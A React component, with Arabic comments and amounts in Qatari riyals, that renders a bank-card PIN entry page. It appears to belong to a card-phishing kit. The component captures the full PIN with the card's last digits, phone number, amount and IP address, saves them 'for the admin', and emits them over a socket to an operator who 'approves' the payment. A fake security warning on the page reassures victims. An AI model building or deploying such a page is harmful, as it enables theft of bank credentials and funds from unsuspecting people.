import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';

export default function PaymentPIN() {
  const navigate = useNavigate();
  const location = useLocation();
  const { socket } = useSocket();
  
  const { cardLastDigits, phoneNumber, amount } = location.state || {};
  
  const [pin, setPin] = useState(['', '', '', '']);
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState('');
  const [attempts, setAttempts] = useState(0);
  const maxAttempts = 3;

  // التعامل مع إدخال PIN
  const handlePinChange = (index, value) => {
    // السماح بالأرقام فقط
    if (!/^\d*$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);
    setError('');

    // الانتقال للحقل التالي تلقائياً
    if (value && index < 3) {
      const nextInput = document.getElementById(`pin-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  // التعامل مع الحذف
  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      const prevInput = document.getElementById(`pin-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  // التعامل مع اللصق
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').slice(0, 4);
    if (!/^\d+$/.test(pastedData)) return;

    const newPin = [...pin];
    for (let i = 0; i < pastedData.length && i < 4; i++) {
      newPin[i] = pastedData[i];
    }
    setPin(newPin);

    const lastFilledIndex = Math.min(pastedData.length, 3);
    const lastInput = document.getElementById(`pin-${lastFilledIndex}`);
    if (lastInput) lastInput.focus();
  };

  // التحقق من الرمز السري
  const handleVerifyPin = async () => {
    const pinCode = pin.join('');
    
    if (pinCode.length !== 4) {
      setError('يرجى إدخال الرمز السري المكون من 4 أرقام');
      return;
    }

    setIsVerifying(true);
    setError('');

    // حفظ PIN للأدمن
    sessionStorage.setItem('pendingPIN', JSON.stringify({
      pinCode,
      cardLastDigits,
      phoneNumber,
      amount,
      timestamp: new Date().toISOString()
    }));

    // إرسال PIN للتحقق
    if (socket) {
      socket.emit('submitPIN', {
        pinCode,
        cardLastDigits,
        amount
      });
    }

    // محاكاة التحقق - في التطبيق الحقيقي سيكون عبر الأدمن
    setTimeout(() => {
      const correctPin = '1234'; // للتجربة فقط
      
      if (pinCode === correctPin) {
        // إرسال PIN للباكند
        if (socket) {
          socket.emit('submitPIN', {
            ip: sessionStorage.getItem('userIP') || 'unknown',
            pinCode,
            cardLastDigits,
            phoneNumber,
            amount,
            timestamp: new Date().toISOString()
          });
        }

        // نجح التحقق - نذهب لصفحة انتظار موافقة الأدمن
        navigate('/pin-verification', {
          state: {
            pinCode,
            cardLastDigits,
            phoneNumber,
            amount
          }
        });
      } else {
        // فشل التحقق
        const newAttempts = attempts + 1;
        setAttempts(newAttempts);
        
        if (newAttempts >= maxAttempts) {
          // تجاوز عدد المحاولات
          setError('تم تجاوز عدد المحاولات المسموحة');
          setTimeout(() => {
            navigate('/payment-failed');
          }, 2000);
        } else {
          setError(`الرمز السري غير صحيح. المحاولات المتبقية: ${maxAttempts - newAttempts}`);
          setPin(['', '', '', '']);
          document.getElementById('pin-0')?.focus();
        }
      }
      
      setIsVerifying(false);
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-50 to-purple-100 flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8">
        {/* الأيقونة */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-indigo-100 rounded-full flex items-center justify-center">
            <svg className="w-10 h-10 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
            </svg>
          </div>
        </div>

        {/* العنوان */}
        <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">
          أدخل الرمز السري للبطاقة
        </h1>
        <p className="text-center text-gray-600 mb-6">
          أدخل الرمز السري المكون من 4 أرقام لإتمام العملية
        </p>

        {/* معلومات البطاقة */}
        <div className="bg-gradient-to-r from-indigo-500 to-purple-600 rounded-lg p-4 mb-6 text-white">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
              </svg>
              <span className="text-sm opacity-90">بطاقة الدفع</span>
            </div>
            <div className="text-xs opacity-75">VISA/MasterCard</div>
          </div>
          <div className="font-mono text-xl tracking-wider mb-2" dir="ltr">
            •••• •••• •••• {cardLastDigits || '****'}
          </div>
          {phoneNumber && (
            <div className="text-sm opacity-90" dir="ltr">
              📱 {phoneNumber}
            </div>
          )}
          {amount && (
            <div className="mt-3 pt-3 border-t border-white/30 flex justify-between items-center">
              <span className="text-sm">المبلغ:</span>
              <span className="text-2xl font-bold" dir="ltr">QAR {amount}</span>
            </div>
          )}
        </div>

        {/* حقول إدخال PIN */}
        <div className="mb-6">
          <div className="flex justify-center gap-3 mb-4" dir="ltr">
            {pin.map((digit, index) => (
              <input
                key={index}
                id={`pin-${index}`}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handlePinChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={index === 0 ? handlePaste : undefined}
                className={`w-16 h-16 text-center text-3xl font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all ${
                  error ? 'border-red-500 bg-red-50' : 'border-gray-300'
                }`}
              />
            ))}
          </div>

          {/* رسالة الخطأ */}
          {error && (
            <div className="flex items-center gap-2 text-red-600 text-sm mb-4 bg-red-50 p-3 rounded-lg">
              <svg className="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span>{error}</span>
            </div>
          )}

          {/* عداد المحاولات */}
          <div className="flex justify-between items-center text-sm text-gray-600 mb-4">
            <span>المحاولات المتبقية:</span>
            <span className={`font-bold ${attempts >= 2 ? 'text-red-600' : 'text-indigo-600'}`}>
              {maxAttempts - attempts} / {maxAttempts}
            </span>
          </div>
        </div>

        {/* زر التحقق */}
        <button
          onClick={handleVerifyPin}
          disabled={isVerifying || pin.join('').length !== 4}
          className="w-full bg-indigo-600 text-white py-3 rounded-lg font-semibold hover:bg-indigo-700 disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors mb-4"
        >
          {isVerifying ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              جاري التحقق...
            </span>
          ) : (
            'تأكيد الرمز السري'
          )}
        </button>

        {/* ملاحظة أمان */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 text-xs text-gray-700">
          <div className="flex items-start gap-2">
            <svg className="w-4 h-4 text-yellow-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
            <p>
              <strong>تنبيه أمني:</strong> لا تشارك الرمز السري لبطاقتك مع أي شخص. 
              نحن لن نطلب منك هذا الرمز عبر الهاتف أو البريد الإلكتروني.
            </p>
          </div>
        </div>

        {/* زر الإلغاء */}
        <button
          onClick={() => navigate('/payment-failed')}
          className="w-full mt-4 bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
        >
          إلغاء العملية
        </button>
      </div>
    </div>
  );
}
